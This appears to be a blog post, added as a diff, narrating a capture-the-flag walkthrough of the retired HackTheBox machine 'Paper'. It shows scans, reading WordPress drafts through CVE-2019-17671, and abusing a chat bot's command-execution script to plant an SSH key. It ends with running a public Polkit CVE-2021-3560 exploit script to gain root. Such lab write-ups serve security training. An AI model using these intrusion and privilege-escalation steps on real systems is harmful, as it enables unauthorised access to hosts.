@@ -1,0 +1,493 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="" />
+
+  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
+
+    <link id="dark-theme-style" rel="stylesheet" type="text/css"
+          media="(prefers-color-scheme: dark)"
+    href="../../theme/stylesheet/dark-theme.min.css">
+
+    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: dark)"
+          href="../../theme/pygments/monokai.min.css">
+    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
+              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
+          href="../../theme/pygments/sas.min.css">
+
+
+  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
+  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
+  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
+
+
+    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
+
+
+
+  
+
+
+ 
+
+<meta name="author" content="maggick" />
+<meta name="description" content="This article is a writeup about a retired HacktheBox machine: Paper publish on February 05, 2022 by secnigma. This box is rated as an easy machine. It implies a verbose header, a vulnerable WordPress a rocket chat bot and the PolKit exploit." />
+<meta name="keywords" content="security, boot2root, HTB, Wordpress, CVE-2019-17671 (wordpress), CVE-2021-3560 (polkit)">
+
+
+  <meta property="og:site_name" content="maggick's logs"/>
+  <meta property="og:title" content="HTB: Paper"/>
+  <meta property="og:description" content="This article is a writeup about a retired HacktheBox machine: Paper publish on February 05, 2022 by secnigma. This box is rated as an easy machine. It implies a verbose header, a vulnerable WordPress a rocket chat bot and the PolKit exploit."/>
+  <meta property="og:locale" content="en_US"/>
+  <meta property="og:url" content="../../2022/06/htb-paper.html"/>
+  <meta property="og:type" content="article"/>
+  <meta property="article:published_time" content="2022-06-19 14:55:00+02:00"/>
+  <meta property="article:modified_time" content=""/>
+  <meta property="article:author" content="../../author/maggick.html">
+  <meta property="article:section" content="security"/>
+  <meta property="article:tag" content="security"/>
+  <meta property="article:tag" content="boot2root"/>
+  <meta property="article:tag" content="HTB"/>
+  <meta property="article:tag" content="Wordpress"/>
+  <meta property="article:tag" content="CVE-2019-17671 (wordpress)"/>
+  <meta property="article:tag" content="CVE-2021-3560 (polkit)"/>
+  <meta property="og:image" content="https://maggick.fr/media/image.png">
+
+  <title>maggick's logs &ndash; HTB: Paper</title>
+
+</head>
+<body >
+  <aside>
+    <div>
+      <a href="../../">
+        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
+      </a>
+
+      <h1>
+        <a href="../../">maggick's logs</a>
+      </h1>
+
+<p>Offensive security tales</p>
+
+      <nav>
+        <ul class="list">
+
+
+              <li>
+                <a target="_self"
+                   href="../../pages/about.html">
+                  About
+                </a>
+              </li>
+              <li>
+                <a target="_self"
+                   href="../../pages/notes.html">
+                  Notes
+                </a>
+              </li>
+              <li>
+                <a target="_self"
+                   href="../../pages/tools.html">
+                  Tools
+                </a>
+              </li>
+
+        </ul>
+      </nav>
+
+      <ul class="social">
+          <li>
+            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
+              <i class="fab fa-github"></i>
+            </a>
+          </li>
+          <li>
+            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+              <i class="fab fa-twitter"></i>
+            </a>
+          </li>
+          <li>
+            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+              <i class="fab fa-stack-overflow"></i>
+            </a>
+          </li>
+          <li>
+            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+              <i class="fas fa-rss"></i>
+            </a>
+          </li>
+      </ul>
+    </div>
+
+  </aside>
+  <main>
+
+    <nav>
+      <a href="../../">Home</a>
+
+      <a href="/archives.html">Archives</a>
+      <a href="/categories.html">Categories</a>
+      <a href="/tags.html">Tags</a>
+
+      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+
+    </nav>
+
+<article class="single">
+  <header>
+      
+    <h1 id="htb-paper">HTB: Paper</h1>
+    <p>
+      Posted on 19 Jun 2022 in <a href="../../category/security.html">security</a>
+
+        &#8226; 5 min read
+    </p>
+  </header>
+
+
+  <div>
+    <p><img class="align-left" src="/media/2022.06/paper_card.png" alt="Paper Card" width="262"></p>
+<p>This article is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.com/home/machines/profile/432">Paper</a> publish on
+February 05, 2022 by
+<a href="https://www.hackthebox.com/home/users/profile/92926">secnigma</a>.
+This box is rated as an easy machine. It implies a verbose header, a vulnerable
+<a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">WordPress</a>
+a rocket chat bot and the
+<a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">PolKit</a> exploit.</p>
+
+
+<h1>Foothold and user</h1>
+<h2>Recon</h2>
+<p>Let us start as always by a <code>nmap</code> scan. Only port 80 (HTTP), 443 (HTTPS) and 22 (SSH) are
+open.</p>
+<div class="highlight"><pre><span></span><code># Nmap 7.92 scan initiated Fri Feb 11 04:02:34 2022 as: nmap -p- -oN notes.md -sSV 10.129.138.109
+Nmap scan report for 10.129.138.109
+Host is up (0.014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Feb 11 04:03:00 2022 -- 1 IP address (1 host up) scanned in 25.78 seconds
+</code></pre></div>
+
+<p>The website is a default <code>nginx</code> page.</p>
+<p><img alt="website" src="/media/2022.06/paper_01.png"></p>
+<p>We run a <code>niko</code> on the box and found the header disclosing the <code>office.paper</code> subdomain.</p>
+<div class="highlight"><pre><span></span><code>$ nikto -h http://10.129.138.109
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.129.138.109
++ Target Hostname:    10.129.138.109
++ Target Port:        80
++ Start Time:         2022-02-11 04:08:10 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &#39;x-backend-server&#39; found, with contents: office.paper
+</code></pre></div>
+
+<p>The new website is a WordPress with a few articles and comments mentioning
+sensible data in the drats article.</p>
+<p><img alt="Wordpress" src="/media/2022.06/paper_02.png"></p>
+<p>The different articles and comments show that there might be juicy information
+in draft posts and that they are not as secure as <code>prisonmike</code> think.
+We run a <code>wpscan</code> on it.</p>
+<div class="highlight"><pre><span></span><code>$ wpscan --url http://office.paper/  --api-token 7B19[REDACTED]
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.20
+      Sponsored by Automattic - https://automattic.com/
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://office.paper/ [10.129.138.109]
+[+] Started: Fri Feb 11 05:04:13 2022
+
+Interesting Finding(s):
+
+[+] Headers
+| Interesting Entries:
+|  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|  - X-Powered-By: PHP/7.2.24
+|  - X-Backend-Server: office.paper
+| Found By: Headers (Passive Detection)
+| Confidence: 100%
+
+[+] WordPress readme found: http://office.paper/readme.html
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 100%
+
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+| Found By: Rss Generator (Passive Detection)
+|  - http://office.paper/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
+|  - http://office.paper/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.2.3&lt;/generator&gt;
+|
+| [!] 31 vulnerabilities identified:
+|
+| [!] Title: WordPress &lt;= 5.2.3 - Stored XSS in Customizer
+|     Fixed in: 5.2.4
+|     References:
+|      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
+|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
+|      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+|      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+|
+| [!] Title: WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts
+|     Fixed in: 5.2.4
+|     References:
+|      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
+|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
+|      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+|      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+|      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
+|      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
+&lt;SNIP&gt;
+</code></pre></div>
+
+<p>The site is vulnerable to <a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/">CVE-2019-17671</a>
+allowing unauthenticated users to view
+the draft posts. We take a look at <code>prisonmike</code>'s one using the
+URL <code>http://office.paper/index.php/author/prisonmike/?static=1</code>. We got a
+"secret registration URL" for the rocket chat.</p>
+<div class="highlight"><pre><span></span><code><span class="o">&gt;</span><span class="n">test</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="n">Threat</span><span class="w"> </span><span class="n">Level</span><span class="w"> </span><span class="n">Midnight</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="n">A</span><span class="w"> </span><span class="n">MOTION</span><span class="w"> </span><span class="n">PICTURE</span><span class="w"> </span><span class="n">SCREENPLAY</span><span class="p">,</span><span class="w"></span>
+<span class="o">&gt;</span><span class="n">WRITTEN</span><span class="w"> </span><span class="n">AND</span><span class="w"> </span><span class="n">DIRECTED</span><span class="w"> </span><span class="n">BY</span><span class="w"></span>
+<span class="o">&gt;</span><span class="n">MICHAEL</span><span class="w"> </span><span class="n">SCOTT</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="p">[</span><span class="nl">INT:</span><span class="n">DAY</span><span class="p">]</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="n">Inside</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">FBI</span><span class="p">,</span><span class="w"> </span><span class="n">Agent</span><span class="w"> </span><span class="n">Michael</span><span class="w"> </span><span class="n">Scarn</span><span class="w"> </span><span class="n">sits</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">feet</span><span class="w"> </span><span class="n">up</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">his</span><span class="w"> </span><span class="n">desk</span><span class="p">.</span><span class="w"> </span><span class="n">His</span><span class="w"> </span><span class="n">robotic</span><span class="w"> </span><span class="n">butler</span><span class="w"> </span><span class="n">Dwigt</span><span class="err">…</span><span class="p">.</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="p">#</span><span class="w"> </span><span class="n">Secret</span><span class="w"> </span><span class="n">Registration</span><span class="w"> </span><span class="n">URL</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">Employee</span><span class="w"> </span><span class="n">chat</span><span class="w"> </span><span class="n">system</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="nl">http:</span><span class="c1">//chat.office.paper/register/8qozr226AhkCHZdyY</span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="p">#</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="n">keeping</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="n">draft</span><span class="w"> </span><span class="n">unpublished</span><span class="p">,</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">unpublished</span><span class="w"> </span><span class="n">drafts</span><span class="w"> </span><span class="n">cannot</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">accessed</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">outsiders</span><span class="p">.</span><span class="w"> </span><span class="n">I</span><span class="w"> </span><span class="n">am</span><span class="w"> </span><span class="k">not</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">ignorant</span><span class="p">,</span><span class="w"> </span><span class="n">Nick</span><span class="p">.</span><span class="w"></span>
+<span class="o">&gt;</span><span class="w"></span>
+<span class="o">&gt;</span><span class="p">#</span><span class="w"> </span><span class="n">Also</span><span class="p">,</span><span class="w"> </span><span class="n">stop</span><span class="w"> </span><span class="n">looking</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">my</span><span class="w"> </span><span class="n">drafts</span><span class="p">.</span><span class="w"> </span><span class="n">Jeez</span><span class="o">!</span><span class="w"></span>
+</code></pre></div>
+
+<p>We register an account and see that there is bot <code>recyclops</code> that allow to request and view
+files. We can start a private discussion with it and query its help menu.</p>
+<p>We enumerate the working directory using the <code>file</code> command and discover that
+<code>file ../</code> is working.
+We enumerate the folder and found the bot home directory containing a scripts
+folder with a <code>run.js</code> script inside.</p>
+<div class="highlight"><pre><span></span><code><span class="c1">// Description:</span><span class="w"></span>
+<span class="c1">// Runs a command on hubot</span><span class="w"></span>
+<span class="c1">// TOTAL VIOLATION of any and all security!</span><span class="w"></span>
+<span class="c1">//</span><span class="w"></span>
+<span class="c1">// Commands:</span><span class="w"></span>
+<span class="c1">// hubot run &lt;command&gt; - runs a command on hubot host</span><span class="w"></span>
+
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">robot</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="nx">robot</span><span class="p">.</span><span class="nx">respond</span><span class="p">(</span><span class="s2">&quot;/RUN (.*)$/i&quot;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">msg</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">      </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="kd">var</span><span class="w"> </span><span class="nx">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">match</span><span class="p">[</span><span class="mf">1</span><span class="p">];</span><span class="w"></span>
+<span class="w">      </span><span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;Running &quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">cmd</span><span class="p">);</span><span class="w"></span>
+<span class="w">      </span><span class="kd">var</span><span class="w"> </span><span class="nx">exec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">).</span><span class="nx">exec</span><span class="p">;</span><span class="w"></span>
+<span class="w">      </span><span class="nx">exec</span><span class="p">(</span><span class="nx">cmd</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">error</span><span class="p">,</span><span class="w"> </span><span class="nx">stdout</span><span class="p">,</span><span class="w"> </span><span class="nx">stderr</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span><span class="w"></span>
+<span class="w">          </span><span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">stderr</span><span class="p">);</span><span class="w"></span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">          </span><span class="nx">msg</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">stdout</span><span class="p">);</span><span class="w"></span>
+<span class="w">          </span><span class="p">}</span><span class="w"></span>
+<span class="w">          </span><span class="p">});</span><span class="w"></span>
+<span class="w">      </span><span class="p">});</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+</code></pre></div>
+
+<p>We use it and run <code>id</code>. We discover that the bot is running as the <code>dwight</code> user
+on the box. We can directly grab the user flag but we want a shell as user.</p>
+<div class="highlight"><pre><span></span><code>run id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+</code></pre></div>
+
+<p>We upload our SSH key on the box.</p>
+<div class="highlight"><pre><span></span><code>run echo &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzB[SNIP] kali@kali&#39; &gt;&gt; ~/.ssh/authorized_keys
+</code></pre></div>
+
+<p>We can then logging as <code>dwight</code> using SSH and grab the user flag.</p>
+<div class="highlight"><pre><span></span><code>$ ssh 10.129.138.109 -ldwight
+[dwight@paper ~]$ cat user.txt
+48cd829918540bb7a9bec8676f5b0024
+</code></pre></div>
+
+<h1>Root</h1>
+<p>The root part is a wild ride and I discussed it directly with the box author
+<a href="https://www.hackthebox.com/home/users/profile/92926">secnigma</a> over Discord.</p>
+<p>When the box was released there was a bug in
+<a href="https://github.com/carlospolop/PEASS-ng">linpeas</a>
+<a href="https://github.com/carlospolop/PEASS-ng/commit/48ff8b061b1724138313e362eac3cc84cc2dec73">fixed in the first days of the box</a></p>
+<p>As you can see in the <a href="https://github.com/carlospolop/PEASS-ng/commit/48ff8b061b1724138313e362eac3cc84cc2dec73">commit</a>
+the script always flagged a box using <code>yum</code> as "Vulnerable to CVE-2021-3560"
+(Polkit) if we run a
+<a href="https://github.com/carlospolop/PEASS-ng">linpeas</a> <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220205">release prior to the patch
+date on the box</a>
+we will see that the box is marked as vulnerable.</p>
+<div class="highlight"><pre><span></span><code>[dwight@paper ~]$ sh linpeas.sh
+
+
+╔══════════╣ Sudo version
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.29
+
+Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id &quot;failovermethod&quot; does not exist
+Invalid configuration value: failovermethod=priority in /etc/yum.repos.d/nodesource-el8.repo; Configuration: OptionBinding with id &quot;failovermethod&quot; does not exist
+Modular dependency problems:
+
+Problem 1: conflicting requests
+  - nothing provides module(perl:5.26) needed by module perl-IO-Socket-SSL:2.066:8030020201222215140:1e4bbb35.x86_64
+Problem 2: conflicting requests
+  - nothing provides module(perl:5.26) needed by module perl-libwww-perl:6.34:8030020201223164340:b967a9a2.x86_64
+Vulnerable to CVE-2021-3560
+</code></pre></div>
+
+<p>Of course, running a later version does not show the box as vulnerable to the
+CVE as <code>yum list installed | grep polkit</code> return an empty string.
+Nonetheless the box is vulnerable to it. This information can be found using
+directly <code>rmp</code> to list the package and looking at the <code>polkit</code> version (v0.113
+to v0.118 are vulnerable).</p>
+<div class="highlight"><pre><span></span><code>[dwight@paper ~]$ rpm -qa|grep -i polkit
+polkit-0.115-6.el8.x86_64
+polkit-pkla-compat-0.1-12.el8.x86_64
+polkit-libs-0.115-6.el8.x86_64
+</code></pre></div>
+
+<h2>Polkit</h2>
+<p><a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/">The Polkit exploit</a>
+is largely documented but as it is race condition it need to be performed
+quickly. Moreover the box author used a cleanup mechanism that regularly (2
+minutes) rewrite the <code>/etc/passwd</code> and <code>/etc/shadow</code> files. The box author
+developed a <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation/">script, publish on github</a>
+that automate this process. We can run the <code>poc.sh</code> on the box and <code>switch user</code>
+as <code>secnimga</code> and then <code>sudo bash</code> to get a root shell and get the flag.</p>
+<div class="highlight"><pre><span></span><code>[dwight@paper ~]$ sh poc.sh -t=0.002 &amp;&amp; su secnigma
+
+[!] Username set as : secnigma
+[!] Timing set to : 0.002
+[!] Force flag not set.
+[!] Vulnerability checking is ENABLED!
+[!] Starting Vulnerability Checks...
+[!] Checking distribution...
+[!] Detected Linux distribution as &quot;centos&quot;
+[!] Checking if Accountsservice and Gnome-Control-Center is installed
+[+] Accounts service and Gnome-Control-Center Installation Found!!
+[!] Checking if polkit version is vulnerable
+[+] Polkit version appears to be vulnerable!!
+[!] Starting exploit...
+[!] Inserting Username secnigma...
+Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+[+] Inserted Username secnigma  with UID 1005!
+[!] Inserting password hash...
+[!] It looks like the password insertion was succesful!
+[!] Try to login as the injected user using sudo - secnigma
+[!] When prompted for password, enter your password
+[!] If the username is inserted, but the login fails; try running the exploit again.
+[!] If the login was succesful,simply enter &#39;sudo bash&#39; and drop into a root shell!
+Password:
+[secnigma@paper dwight]$ id
+uid=1005(secnigma) gid=1005(secnigma) groups=1005(secnigma),10(wheel)
+[secnigma@paper dwight]$ sudo bash
+[sudo] password for secnigma:
+[root@paper dwight]# cat^C
+[root@paper dwight]# cd
+[root@paper ~]# cd /root/
+[root@paper ~]# cat root.txt
+254b5756cdc3dfa2cc7ff4703e76758d
+</code></pre></div>
+
+<h1>Wrapping up</h1>
+<p>Overall a great realistic box with a lot of interaction and different
+vulnerabilities for the user part.</p>
+  </div>
+  <div class="tag-cloud">
+    <p>
+      <a href="../../tag/security.html">security</a>
+      <a href="../../tag/boot2root.html">boot2root</a>
+      <a href="../../tag/htb.html">HTB</a>
+      <a href="../../tag/wordpress.html">Wordpress</a>
+      <a href="../../tag/cve-2019-17671-wordpress.html">CVE-2019-17671 (wordpress)</a>
+      <a href="../../tag/cve-2021-3560-polkit.html">CVE-2021-3560 (polkit)</a>
+    </p>
+  </div>
+
+
+  <div class="neighbors">
+    <a class="btn float-left" href="../../2022/06/htb-meta.html" title="HTB: Meta">
+      <i class="fa fa-angle-left"></i> Previous Post
+    </a>
+  </div>
+
+
+
+</article>
+
+    <footer>
+<p>
+  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+</p>
+<p>
+Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
+  <span class="footer-separator">|</span>
+  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
+  <script id="dark-theme-script"
+          src="../../theme/dark-theme/dark-theme.min.js"
+          data-enable-auto-detect-theme="True"
+          data-default-theme="light"
+          type="text/javascript">
+  </script>
+</p><p>
+  <a rel="license"
+     href="http://creativecommons.org/licenses/by/4.0/"
+     target="_blank">
+    <img alt="Creative Commons License"
+         title="Creative Commons License"
+         style="border-width:0"
+           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
+         width="80"
+         height="15"/>
+  </a>
+</p>    </footer>
+  </main>
+
+
+
+
+<script type="application/ld+json">
+{
+  "@context" : "http://schema.org",
+  "@type" : "Blog",
+  "name": " maggick's logs ",
+  "url" : "../..",
+  "image": "https://maggick.fr/media/image.png",
+  "description": ""
+}
+</script>
+
+</body>
+</html>
